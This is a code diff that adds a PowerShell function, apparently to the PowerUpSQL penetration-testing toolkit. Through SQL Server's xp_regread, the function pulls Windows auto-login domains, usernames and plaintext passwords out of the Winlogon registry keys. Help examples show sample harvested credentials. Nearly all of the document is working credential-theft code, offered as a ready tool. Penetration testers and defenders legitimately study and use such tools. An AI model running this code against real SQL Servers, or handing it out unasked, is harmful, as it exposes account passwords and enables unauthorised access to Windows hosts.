@@ -9453,7 +9453,238 @@ Function  Get-SQLInstanceFile
 #region          PASSWORD RECOVERY FUNCTIONS
 #
 #########################################################################
-#
+
+# ----------------------------------
+#  Get-SQLWinAutoLoginPw
+# ----------------------------------
+# Author: Scott Sutherland
+Function   Get-SQLWinAutoLoginPw
+{
+    <#
+            .SYNOPSIS
+            Returns the Windows auto login credentials through SQL Server using xp_regread. 
+            This will work with the Public role prior to SQL Server 2014.  
+            SQL Server 2014 and later will require sysadmin privileges.
+            .PARAMETER Username
+            SQL Server or domain account to authenticate with.
+            .PARAMETER Password
+            SQL Server or domain account password to authenticate with.
+            .PARAMETER Credential
+            SQL Server credential.
+            .PARAMETER Instance
+            SQL Server instance to connection to.
+            .Example
+            PS C:\> Get-SQLInstanceLocal |  Get-SQLWinAutoLoginPw -Verbose
+            VERBOSE: SQLServer1\SQLEXPRESS : Connection Success.
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.
+            VERBOSE: SQLServer1 : Connection Success.
+
+
+            ComputerName : SQLServer1
+            Instance     : SQLServer1\SQLEXPRESS
+            Domain       : Demo
+            UserName     : KioskAdmin
+            Password     : KioskPassword!
+
+            ComputerName : SQLServer1
+            Instance     : SQLServer1\SQLEXPRESS
+            Domain       : Demo
+            UserName     : kioskuser
+            Password     : KioskUserPassword!
+
+            .Example
+            PS C:\> Get-SQLWinAutoLoginPw -Verbose -instance SQLServer1\STANDARDDEV2014
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.
+
+
+            ComputerName : SQLServer1
+            Instance     : SQLServer1\STANDARDDEV2014
+            Domain       : localhost
+            UserName     : KioskAdmin
+            Password     : KioskPassword!
+
+            ComputerName : SQLServer1
+            Instance     : SQLServer1\STANDARDDEV2014
+            Domain       : localhost2
+            UserName     : kioskuser
+            Password     : KioskUserPassword!
+
+            .Notes
+            https://support.microsoft.com/en-us/kb/321185
+    #>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account to authenticate with.')]
+        [string]$Username,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
+        [string]$Password,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Windows credentials.')]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
+
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'SQL Server instance to connection to.')]
+        [string]$Instance,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
+        [switch]$SuppressVerbose
+    )
+
+    Begin
+    {
+        # Table for output
+        $TblWinAutoCreds = New-Object -TypeName System.Data.DataTable
+        $TblWinAutoCreds.Columns.Add("ComputerName") | Out-Null
+        $TblWinAutoCreds.Columns.Add("Instance") | Out-Null
+        $TblWinAutoCreds.Columns.Add("Domain") | Out-Null
+        $TblWinAutoCreds.Columns.Add("UserName") | Out-Null
+        $TblWinAutoCreds.Columns.Add("Password") | Out-Null
+    }
+
+    Process
+    {
+        # Parse computer name from the instance
+        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
+
+        # Default connection to local default instance
+        if(-not $Instance)
+        {
+            $Instance = $env:COMPUTERNAME
+        }
+
+        # Test connection to instance
+        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
+            $_.Status -eq 'Accessible'
+        }
+        if($TestConnection)
+        {
+            if( -not $SuppressVerbose)
+            {
+                Write-Verbose -Message "$Instance : Connection Success."
+            }
+        }
+        else
+        {
+            if( -not $SuppressVerbose)
+            {
+                Write-Verbose -Message "$Instance : Connection Failed."
+            }
+            return
+        }       
+
+        # Get sysadmin status
+        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
+
+        # Get SQL Server version number
+        $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
+        if($SQLVersionFull)
+        {
+            $SQLVersionShort = $SQLVersionFull.Split('.')[0]
+        }
+
+        # Check if this can actually run with the current login
+        if([int]$SQLVersionShort -ge 12 -and $IsSysadmin -ne "Yes")
+        {          
+            Write-Output "This module requires a version less than 2012 or sysadmin privileges. Exiting."
+            Return
+        }
+
+        # Get default auto login Query
+        $DefaultQuery = "
+        -------------------------------------------------------------------------
+        -- Get Windows Auto Login Credentials from the Registry
+        -------------------------------------------------------------------------
+
+        -- Get AutoLogin Default Domain
+        DECLARE @AutoLoginDomain  SYSNAME
+        EXECUTE master.dbo.xp_regread
+        @rootkey		= N'HKEY_LOCAL_MACHINE',
+        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
+        @value_name		= N'DefaultDomainName',
+        @value			= @AutoLoginDomain output
+
+        -- Get AutoLogin DefaultUsername
+        DECLARE @AutoLoginUser  SYSNAME
+        EXECUTE master.dbo.xp_regread
+        @rootkey		= N'HKEY_LOCAL_MACHINE',
+        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
+        @value_name		= N'DefaultUserName',
+        @value			= @AutoLoginUser output
+
+        -- Get AutoLogin DefaultUsername
+        DECLARE @AutoLoginPassword  SYSNAME
+        EXECUTE master.dbo.xp_regread
+        @rootkey		= N'HKEY_LOCAL_MACHINE',
+        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
+        @value_name		= N'DefaultPassword',
+        @value			= @AutoLoginPassword output
+
+        -- Display Results
+        SELECT Domain = @AutoLoginDomain, Username = @AutoLoginUser, Password = @AutoLoginPassword"
+
+        # Execute Default Query
+        Get-SQLQuery -Instance $Instance -Query $DefaultQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose |
+        ForEach-Object{
+
+            # Add record to data table
+            $TblWinAutoCreds.Rows.Add($ComputerName, $Instance,$_.Domain,$_.Username,$_.Password) | Out-Null
+        }
+
+        # Get default alt auto login Query
+        $AltQuery = "
+        -------------------------------------------------------------------------
+        -- Get Alternative Windows Auto Login Credentials from the Registry
+        -------------------------------------------------------------------------
+
+        -- Get Alt AutoLogin Default Domain
+        DECLARE @AltAutoLoginDomain  SYSNAME
+        EXECUTE master.dbo.xp_regread
+        @rootkey		= N'HKEY_LOCAL_MACHINE',
+        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
+        @value_name		= N'AltDefaultDomainName',
+        @value			= @AltAutoLoginDomain output
+
+        -- Get Alt AutoLogin DefaultUsername
+        DECLARE @AltAutoLoginUser  SYSNAME
+        EXECUTE master.dbo.xp_regread
+        @rootkey		= N'HKEY_LOCAL_MACHINE',
+        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
+        @value_name		= N'AltDefaultUserName',
+        @value			= @AltAutoLoginUser output
+
+        -- Get Alt AutoLogin DefaultUsername
+        DECLARE @AltAutoLoginPassword  SYSNAME
+        EXECUTE master.dbo.xp_regread
+        @rootkey		= N'HKEY_LOCAL_MACHINE',
+        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
+        @value_name		= N'AltDefaultPassword',
+        @value			= @AltAutoLoginPassword output
+
+        -- Display Results
+        SELECT Domain = @AltAutoLoginDomain, Username = @AltAutoLoginUser, Password = @AltAutoLoginPassword"
+
+        # Execute Default Query
+        Get-SQLQuery -Instance $Instance -Query $AltQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose |
+        ForEach-Object{
+
+            # Add record to data table
+            $TblWinAutoCreds.Rows.Add($ComputerName, $Instance,$_.Domain,$_.Username,$_.Password) | Out-Null
+        }
+    }
+
+    End
+    {
+        # Return data
+         $TblWinAutoCreds 
+    }
+}
 #endregion
 
 #########################################################################
